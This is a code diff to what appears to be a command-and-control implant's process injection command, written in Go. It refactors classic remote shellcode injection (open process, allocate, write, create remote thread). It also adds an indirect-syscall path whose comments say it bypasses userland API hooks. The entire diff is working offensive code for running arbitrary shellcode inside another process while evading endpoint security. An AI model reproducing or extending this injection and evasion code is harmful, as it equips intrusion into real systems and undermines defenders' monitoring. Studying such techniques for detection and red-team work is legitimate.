@@ -138,18 +138,29 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 	output := fmt.Sprintf("[*] Received shellcode: %d bytes\n", len(shellcode))
 	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)
 
+	// Use indirect syscalls if available (bypasses userland API hooks)
+	if IndirectSyscallsAvailable() {
+		return c.executeIndirect(params.PID, shellcode, output)
+	}
+	return c.executeStandard(params.PID, shellcode, output)
+}
+
+// executeStandard uses standard Win32 API calls (VirtualAllocEx, WriteProcessMemory, etc.)
+func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, output string) structs.CommandResult {
+	output += "[*] Using standard Win32 API calls\n"
+
 	// Step 1: Open handle to target process
-	output += fmt.Sprintf("[*] Opening handle to process %d...\n", params.PID)
-	
-	desiredAccess := PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
-	                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
-	
+	output += fmt.Sprintf("[*] Opening handle to process %d...\n", pid)
+
+	desiredAccess := PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+
 	hProcess, _, err := procOpenProcess.Call(
 		uintptr(desiredAccess),
 		uintptr(0),
-		uintptr(params.PID),
+		uintptr(pid),
 	)
-	
+
 	if hProcess == 0 {
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("[!] Failed to open process: %v\n", err),
@@ -158,12 +169,12 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		}
 	}
 	defer procCloseHandle.Call(hProcess)
-	
+
 	output += "[+] Successfully opened process handle\n"
 
 	// Step 2: Allocate memory in remote process with RX permissions
 	output += fmt.Sprintf("[*] Allocating %d bytes of RX memory in remote process...\n", len(shellcode))
-	
+
 	remoteAddr, _, err := procVirtualAllocEx.Call(
 		hProcess,
 		uintptr(0),
@@ -171,7 +182,7 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		uintptr(MEM_COMMIT|MEM_RESERVE),
 		uintptr(PAGE_EXECUTE_READ),
 	)
-	
+
 	if remoteAddr == 0 {
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("[!] VirtualAllocEx failed: %v\n", err),
@@ -179,12 +190,12 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 			Completed: true,
 		}
 	}
-	
+
 	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", remoteAddr)
 
 	// Step 3: Write shellcode to remote process memory
 	output += "[*] Writing shellcode to remote process memory...\n"
-	
+
 	var bytesWritten uintptr
 	ret, _, err := procWriteProcessMemory.Call(
 		hProcess,
@@ -193,7 +204,7 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		uintptr(len(shellcode)),
 		uintptr(unsafe.Pointer(&bytesWritten)),
 	)
-	
+
 	if ret == 0 {
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("[!] WriteProcessMemory failed: %v\n", err),
@@ -201,12 +212,12 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 			Completed: true,
 		}
 	}
-	
+
 	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
 
 	// Step 4: Create remote thread to execute shellcode
 	output += "[*] Creating remote thread...\n"
-	
+
 	hThread, _, err := procCreateRemoteThread.Call(
 		hProcess,
 		uintptr(0),
@@ -216,7 +227,7 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		uintptr(0),
 		uintptr(0),
 	)
-	
+
 	if hThread == 0 {
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("[!] CreateRemoteThread failed: %v\n", err),
@@ -225,9 +236,108 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		}
 	}
 	defer procCloseHandle.Call(hThread)
-	
+
 	output += fmt.Sprintf("[+] Successfully created remote thread (handle: 0x%X)\n", hThread)
 	output += "[+] Vanilla injection completed successfully\n"
+
+	return structs.CommandResult{
+		Output:    output,
+		Status:    "completed",
+		Completed: true,
+	}
+}
+
+// executeIndirect uses indirect syscalls (Nt* via ntdll gadgets) to bypass API hooks.
+// Uses W^X pattern: allocate RW → write → protect RX → execute thread
+func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, output string) structs.CommandResult {
+	output += "[*] Using indirect syscalls (calls originate from ntdll)\n"
+
+	// Step 1: Open handle to target process via NtOpenProcess
+	output += fmt.Sprintf("[*] Opening handle to process %d...\n", pid)
+
+	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
+
+	var hProcess uintptr
+	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer procCloseHandle.Call(hProcess)
+
+	output += "[+] Successfully opened process handle\n"
+
+	// Step 2: Allocate RW memory (W^X: write first, then change to RX)
+	regionSize := uintptr(len(shellcode))
+	var baseAddr uintptr
+	output += fmt.Sprintf("[*] Allocating %d bytes of RW memory via NtAllocateVirtualMemory...\n", regionSize)
+
+	status = IndirectNtAllocateVirtualMemory(hProcess, &baseAddr, &regionSize,
+		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("[!] NtAllocateVirtualMemory failed: NTSTATUS 0x%X\n", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", baseAddr)
+
+	// Step 3: Write shellcode via NtWriteVirtualMemory
+	output += "[*] Writing shellcode via NtWriteVirtualMemory...\n"
+
+	var bytesWritten uintptr
+	status = IndirectNtWriteVirtualMemory(hProcess, baseAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("[!] NtWriteVirtualMemory failed: NTSTATUS 0x%X\n", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
+
+	// Step 4: Change protection from RW to RX (W^X enforcement)
+	output += "[*] Changing memory protection to RX via NtProtectVirtualMemory...\n"
+
+	protectAddr := baseAddr
+	protectSize := uintptr(len(shellcode))
+	var oldProtect uint32
+	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
+		PAGE_EXECUTE_READ, &oldProtect)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("[!] NtProtectVirtualMemory failed: NTSTATUS 0x%X\n", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	output += "[+] Memory protection changed to RX\n"
+
+	// Step 5: Create remote thread via NtCreateThreadEx
+	output += "[*] Creating remote thread via NtCreateThreadEx...\n"
+
+	var hThread uintptr
+	status = IndirectNtCreateThreadEx(&hThread, hProcess, baseAddr)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer procCloseHandle.Call(hThread)
+
+	output += fmt.Sprintf("[+] Successfully created remote thread (handle: 0x%X)\n", hThread)
+	output += "[+] Indirect syscall injection completed successfully\n"
 
 	return structs.CommandResult{
 		Output:    output,
